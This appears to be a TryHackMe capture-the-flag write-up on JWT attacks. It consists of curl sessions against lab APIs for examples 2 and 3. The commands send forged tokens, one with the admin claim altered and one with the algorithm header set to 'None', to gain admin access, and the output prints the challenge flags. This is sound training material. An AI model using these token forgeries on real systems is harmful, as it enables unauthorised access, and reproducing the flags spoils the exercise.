flag of example 2

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.112.178.211/api/v1.0/example2
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}
```

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.112.178.211/api/v1.0/example2?username=user
{
  "message": "Welcome user, you are not an admin"
}
```
<img width="906" height="597" alt="image" src="https://github.com/user-attachments/assets/d442a027-1b7d-4693-9c97-36b4329875b8" />

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc' http://10.112.178.211/api/v1.0/example2?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
}
```


flag of example 3

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.113.167.153/api/v1.0/example3
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}
```

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' http://10.113.167.153/api/v1.0/example3?username=user 
{
  "message": "Welcome user, you are not an admin"
}
```

<img width="961" height="616" alt="image" src="https://github.com/user-attachments/assets/37b976b8-d197-459f-849d-909733c7ea96" />

<img width="955" height="615" alt="image" src="https://github.com/user-attachments/assets/58e814bd-f0d9-4274-bd89-5cc9b54fa6f7" />

```
┌──(kali㉿kali)-[~]
└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0=._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' http://10.113.167.153/api/v1.0/example3?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
}
```

